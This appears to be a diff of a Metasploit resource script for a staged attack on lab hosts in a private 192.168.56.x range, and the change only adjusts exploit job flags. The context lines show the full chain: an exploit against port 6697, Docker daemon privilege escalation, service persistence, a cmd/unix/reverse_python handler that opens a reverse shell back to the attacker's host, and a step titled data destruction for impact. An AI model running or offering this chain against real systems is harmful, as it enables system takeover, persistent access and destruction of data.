@@ -19,8 +19,7 @@ set LHOST 192.168.56.191
 set LPORT 4444
 set RHOSTS 192.168.56.181
 set RPORT 6697
-set ForceExploit true
-exploit -j
+exploit -z
 
 # ============================================================
 # STEP 3 - Docker Daemon Privilege Escalation
@@ -32,8 +31,8 @@ set SESSION 1
 set LHOST 192.168.56.191
 set LPORT 4444
 set PayloadLinuxMinKernel 3.17
-set ForceExploit true
-exploit -j
+exploit -j -z
+# set ForceExploit true (use if necessary)
 
 # ============================================================
 # STEP 4 - Service Persistence
@@ -45,7 +44,7 @@ set SESSION 2
 set LHOST 192.168.56.191
 set LPORT 4444
 set VERBOSE True
-exploit -j
+exploit -z
 
 sessions -k 2,3
 
@@ -56,7 +55,7 @@ sessions -k 2,3
 use exploit/multi/handler
 set PAYLOAD cmd/unix/reverse_python
 set LHOST 192.168.56.191 
-exploit -j
+exploit -j -z
 
 # ============================================================
 # STEP 6 - Data Destruction for Impact
